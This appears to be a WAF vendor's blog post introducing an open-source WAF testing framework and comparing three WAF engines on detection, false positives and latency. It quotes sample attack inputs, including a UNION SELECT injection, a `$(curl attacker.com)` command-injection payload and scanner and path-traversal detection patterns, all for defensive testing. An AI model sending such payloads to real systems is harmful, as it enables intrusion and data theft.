+++
title = "598 Attack Payloads, Three WAF Engines, One Verdict"
description = "We built waf-playbook, an open-source WAF testing framework with 598 tests across 18 OWASP-aligned categories, and used it to benchmark Zentinel's three WAF agent implementations against each other. No engine won everywhere. Here's what the confusion matrices actually say."
date = 2026-03-04
[taxonomies]
tags = ["security", "waf", "agents", "benchmarks", "modsecurity"]
+++

WAF marketing pages love to claim "99.9% detection" without disclosing the false-positive rate, the test corpus, or whether the tests include anything beyond `<script>alert(1)</script>`. We wanted real numbers for Zentinel's WAF agents — numbers attached to a reproducible test suite that anyone can run.

So we built [waf-playbook](https://github.com/zentinelproxy/waf-playbook), an open-source WAF testing framework, and ran 598 test cases against all three of Zentinel's WAF agent implementations. The results were not what we expected.

## Why another WAF testing tool?

Existing tools each solve part of the problem. [go-ftw](https://github.com/coreruleset/go-ftw) is great for CRS regression testing but assumes ModSecurity output. [GoTestWAF](https://github.com/wallarm/gotestwaf) covers broad attack categories but doesn't measure false-positive rates. [WAFBench](https://github.com/nicholasgasior/WAFBench) focuses on throughput, not detection accuracy.

None of them combine detection accuracy + false-positive rate + latency measurement + per-category confusion matrices + encoding auto-generation + multi-WAF comparison in a single package. We needed all of these to make an informed decision about our own agents, so we built it.

## The test suite

598 tests across 18 OWASP-aligned categories:

| Category | Attack tests | Benign tests | Total |
|----------|:-----------:|:------------:|:-----:|
| SQL Injection | 72 | 3 | 75 |
| Cross-Site Scripting | 60 | 2 | 62 |
| WAF Bypass | 66 | 0 | 66 |
| False Positives | 0 | 50 | 50 |
| Known CVEs | 37 | 6 | 43 |
| Path Traversal | 30 | 8 | 38 |
| Command Injection | 30 | 8 | 38 |
| Evasion Techniques | 25 | 5 | 30 |
| Protocol Attacks | 19 | 7 | 26 |
| Scanner Detection | 15 | 10 | 25 |
| API Security | 20 | 8 | 28 |
| Authentication Attacks | 20 | 0 | 20 |
| SSRF | 15 | 5 | 20 |
| SSTI | 15 | 3 | 18 |
| XXE | 15 | 4 | 19 |
| File Upload | 15 | 0 | 15 |
| Deserialization | 12 | 3 | 15 |
| ReDoS | 10 | 0 | 10 |

Every test case specifies the HTTP method, path, query string, headers, body, and expected outcome (block or allow). Tests are grouped by severity (critical, high, medium, low, info) and tagged with OWASP Top 10 references. Here's what one looks like:

```yaml
meta:
  category: "SQL Injection"
  subcategory: "Union-Based"
  owasp: "A03"
  severity: "critical"

tests:
  - id: sqli-union-001
    title: "UNION SELECT with column enumeration"
    tags: ["sqli", "union", "paranoia-1"]
    request:
      method: GET
      path: /api/users
      query_string: "id=1 UNION SELECT username,password FROM users--"
    expected:
      action: block
      status: 403
```

The false-positive category is the most important one. 50 tests with legitimate traffic — search queries like "drop shipping rates", file paths like `/assets/script.js`, REST API parameters with numbers and special characters. A WAF that blocks everything gets 100% detection and a useless false-positive rate.

## The three engines

Zentinel's [agent architecture](/agents/) allows WAF logic to run as an external process that communicates with the proxy over Unix domain sockets or gRPC. We currently have three WAF agent implementations:

**zentinel-waf** — A purpose-built Rust WAF agent with hand-tuned pattern matchers for SQLi, XSS, path traversal, command injection, and protocol violations. No ModSecurity rule language, no regex compilation at startup. Detections are compiled directly into the binary. Communicates via UDS.

**zentinel-zentinelsec** — A pure Rust ModSecurity rule engine ([zentinel-modsec](https://github.com/zentinelproxy/zentinel-modsec)). Parses and evaluates ModSecurity `SecRule` directives including `@detectSQLi`, `@detectXSS`, `@contains`, and `@rx` operators. No C dependencies. Communicates via gRPC.

**zentinel-modsec** — A wrapper around [libmodsecurity](https://github.com/owasp-modsecurity/ModSecurity) (the C library behind ModSecurity v3). Full compatibility with OWASP CRS v4, including the libinjection-based operators. Communicates via UDS.

All three were tested with the same custom rule set using `@detectSQLi`, `@detectXSS`, and `@contains` operators — a set of roughly 75 direct-deny rules covering SQLi, XSS, path traversal, command injection, SSRF, SSTI, scanner detection, and CVE patterns. This gives a fair apples-to-apples comparison of the engines themselves, independent of rule complexity.

## Overall results

| Metric | zentinel-waf | zentinel-zentinelsec | zentinel-modsec |
|--------|:---:|:---:|:---:|
| Detection Rate | **43.1%** | 38.7% | 32.1% |
| False-Positive Rate | 9.0% | **2.5%** | **2.5%** |
| Precision | 94.9% | **98.4%** | 98.1% |
| F1 Score | **59.2%** | 55.5% | 48.4% |
| Balanced Accuracy | 67.0% | **68.1%** | 64.8% |
| Youden's J | 0.340 | **0.362** | 0.297 |
| p95 Latency | **2.8ms** | 3.1ms | 2.9ms |

No engine won everywhere. zentinel-waf has the highest raw detection rate but the worst false-positive rate. zentinel-zentinelsec has the best balanced accuracy — the metric that matters most when you care about both detection *and* operational impact. zentinel-modsec trails slightly despite using the same rules as zentinelsec, revealing differences in operator implementation between the Rust and C engines.

### What balanced accuracy tells you

Detection rate alone is a vanity metric. A WAF that blocks every request has 100% detection and is completely useless. Balanced accuracy — the arithmetic mean of detection rate and specificity (1 minus FP rate) — penalizes both missed attacks and false alarms equally:

```
Balanced Accuracy = (Detection Rate + Specificity) / 2

zentinel-waf:        (0.431 + 0.910) / 2 = 0.670
zentinel-zentinelsec: (0.387 + 0.975) / 2 = 0.681
zentinel-modsec:     (0.321 + 0.975) / 2 = 0.648
```

zentinel-zentinelsec wins despite a lower detection rate because its false-positive rate is nearly 4x lower. In production, false positives mean blocked customers, support tickets, and lost revenue. An engineer investigating a false positive costs more than the attack that a missed detection would have let through — assuming defense in depth.

Youden's J index (detection rate minus FP rate) tells the same story from a different angle. A J of 0.362 means zentinelsec is pulling 36.2% better than random chance, while zentinel-waf's higher detection is partially offset by its 9% FP rate.

## Per-category breakdown

This is where the comparison gets interesting:

| Category | zentinel-waf | zentinel-zentinelsec | zentinel-modsec |
|----------|:---:|:---:|:---:|
| SQL Injection | 37.5% | **66.7%** | 25.0% |
| Cross-Site Scripting | **73.3%** | 70.0% | 70.0% |
| Path Traversal | **80.0%** | 50.0% | 53.3% |
| Known CVEs | **54.1%** | 18.9% | 16.2% |
| Scanner Detection | **80.0%** | 6.7% | 33.3% |
| SSRF | **80.0%** | 60.0% | 60.0% |
| SSTI | **60.0%** | 53.3% | 46.7% |
| Evasion Techniques | 24.0% | **52.0%** | 48.0% |
| WAF Bypass | **56.1%** | 51.5% | 48.5% |
| Command Injection | 3.3% | 3.3% | 3.3% |
| API Security | 0.0% | 0.0% | 0.0% |
| XXE | 0.0% | 0.0% | 0.0% |

Three patterns emerge:

**Pattern-matching breadth favors zentinel-waf.** Known CVE patterns (`.env`, `.git`, `/actuator`, `/wp-login.php`), scanner user-agent strings (`sqlmap`, `nikto`, `nmap`), and path traversal sequences (`../`, `..%2f`, `%2e%2e/`) are hardcoded in the WAF agent binary. It doesn't need ModSecurity rules — the checks are compiled in. This gives it 80% detection on scanner detection and path traversal, compared to the ModSecurity engines which rely on `@contains` rules that are narrower.

**libinjection favors zentinelsec on SQLi.** The `@detectSQLi` operator powered by libinjection detects tokenized SQL patterns regardless of specific keywords. zentinelsec's pure Rust implementation of `@detectSQLi` catches 66.7% of our SQLi corpus — nearly double zentinel-waf's 37.5%. The Rust reimplementation appears to handle edge cases around parenthesized expressions and comment-based obfuscation better than the C version, which caught only 25.0%.

**Evasion resistance correlates with engine sophistication.** zentinelsec's 52% evasion detection vs zentinel-waf's 24% is the starkest gap. Evasion tests include case-alternation (`SeLeCt`), comment injection (`UN/**/ION`), whitespace substitution (`SELECT%09*`), and null-byte insertion. The ModSecurity-style engines normalize and decode before matching, while the purpose-built WAF agent matches against the raw payload.

## The categories no engine handles

Three categories scored 0% across all engines: API Security, XXE, and File Upload.

**API Security** tests include GraphQL introspection, JWT algorithm confusion, JSON depth bombs, prototype pollution, and mass assignment. These are application-logic attacks that a generic WAF rule can't distinguish from legitimate traffic. Protecting against them requires schema validation, rate limiting per operation, and application-aware policies — not pattern matching on query strings.

**XXE** tests embed entity declarations in XML bodies. All three agents currently inspect query strings and headers in phase 1 but apply limited analysis to structured body content. Detecting `<!ENTITY` declarations requires XML-aware body parsing that goes beyond the `@contains` and `@detectSQLi` operators.

**File Upload** tests use multipart form bodies with double extensions (`.php.jpg`), null bytes (`shell.php%00.png`), and polyglot files. Multipart parsing and content-type verification is a specialized capability that none of the engines implement at the rule level with our current rule set.

These gaps are intentional findings, not flaws in the test suite. They define the boundary of what pattern-based WAFs can protect and where application-level controls must take over.

## Command injection: the hardest category

At 3.3% detection across all three engines, command injection is the worst-performing attack category with actual attack tests. Only 1 of 30 attack payloads was caught.

This isn't surprising on closer examination. Our command injection tests include payloads in request bodies, cookies, and custom headers — not just query strings. The `@contains` rules only inspect `QUERY_STRING` for patterns like `;cat `, `|cat `, and `` `cat `` with trailing spaces. A payload like `{"cmd": "$(curl attacker.com)"}` in a JSON body bypasses the rule entirely.

The fix is straightforward: add `ARGS` and `REQUEST_BODY` variables to the command injection rules, and expand the pattern set to cover subshell operators (`$()`, `` ` ` ``), pipes, and semicolons without requiring trailing spaces. This is a rule gap, not an engine gap.

## Latency

All three engines add less than 3ms at p95 to request processing:

| Engine | p50 | p95 | p99 | Mean | Max |
|--------|:---:|:---:|:---:|:----:|:---:|
| zentinel-waf | 2.49ms | **2.77ms** | **3.04ms** | 2.48ms | 5.32ms |
| zentinel-modsec | 2.54ms | 2.87ms | 3.49ms | 2.55ms | 7.39ms |
| zentinel-zentinelsec | 2.59ms | 3.13ms | 3.60ms | 2.61ms | 6.43ms |

zentinel-waf is fastest because its pattern matchers are compiled Rust code — no rule parsing, no regex compilation, no operator dispatch. The ModSecurity engines pay for rule evaluation flexibility with roughly 0.3ms of additional latency at p95.

The practical difference is negligible. At 3ms per request, the WAF agent adds less latency than a single DNS lookup. The bottleneck in any real deployment will be the upstream backend, not the WAF.

## CRS and the anomaly scoring problem

We initially attempted to test zentinel-modsec with the full OWASP Core Rule Set v4. CRS uses anomaly scoring: individual detection rules increment a score variable, and a separate blocking evaluation rule (REQUEST-949) denies requests that exceed a threshold.

This didn't work. Every request — including clean ones — was blocked with status 500. The root cause: CRS rule 901001 checks for a `tx.crs_setup_version` variable and denies with status 500 if it's missing. Our initial setup file didn't set it.

After fixing the setup, CRS loaded without errors but anomaly scoring still didn't block anything. The blocking evaluation rule uses macro expansion (`@ge %{tx.inbound_anomaly_score_threshold}`) to compare the accumulated score against a configurable threshold. This macro expansion appears to not work correctly through the Rust bindings to libmodsecurity — the individual detection rules fire and increment score variables, but the final comparison in rule 949 never triggers.

This is a known limitation of using libmodsecurity through FFI. The C library's variable expansion depends on internal state management that doesn't translate cleanly through the bindings. We're investigating whether this is a binding issue or a fundamental incompatibility, and we plan to publish findings separately.

For now, the zentinel-modsec agent works correctly with direct-deny rules (no anomaly scoring), which is the configuration we tested.

## What we're shipping

Based on these results, we're making three changes:

**1. zentinel-zentinelsec becomes the default WAF agent.** Its balanced accuracy (68.1%) and precision (98.4%) make it the safest choice for production deployments. The 2.5% false-positive rate means roughly 1 in 40 false alarms — manageable with allowlisting.

**2. zentinel-waf gets an evasion normalization layer.** The 24% evasion detection rate is unacceptable. Adding URL decoding, case normalization, and comment stripping before pattern matching should close most of the gap with the ModSecurity engines, without sacrificing the compilation-time advantage.

**3. Command injection rules are getting expanded.** All three engines need `ARGS` and `REQUEST_BODY` inspection for command injection patterns. This is the highest-leverage rule improvement available — going from 3.3% to an estimated 30-40% detection with a few additional `SecRule` directives.

## Try it yourself

waf-playbook is open source and runs against any WAF. The test suite isn't Zentinel-specific — it tests HTTP responses against expected status codes.

```bash
# Install
pip install waf-playbook

# Run against any WAF
waf-playbook run \
  --target http://your-waf:8080 \
  --name my-waf \
  --block-status 403 \
  --output results/my-waf/

# Compare multiple WAFs
waf-playbook compare \
  -r results/waf-a/ \
  -r results/waf-b/ \
  -o results/comparison/

# CI integration: fail if detection drops below 90%
waf-playbook run \
  --target http://your-waf:8080 \
  --fail-under 0.90 \
  --fail-fp-over 0.05
```

The framework supports 9 payload encodings (URL, double-URL, hex, Unicode escape, HTML entity, base64, UTF-7, overlong UTF-8) for automatic evasion testing, go-ftw format import for existing CRS test suites, and JSON/Markdown/Console output for CI pipelines.

598 tests, 18 categories, full confusion matrices. No engine scored above 50% detection. That's not a failure of the engines — it's a honest measurement of where pattern-based WAFs stand against a modern attack corpus. Defense in depth isn't a platitude. It's an engineering requirement.
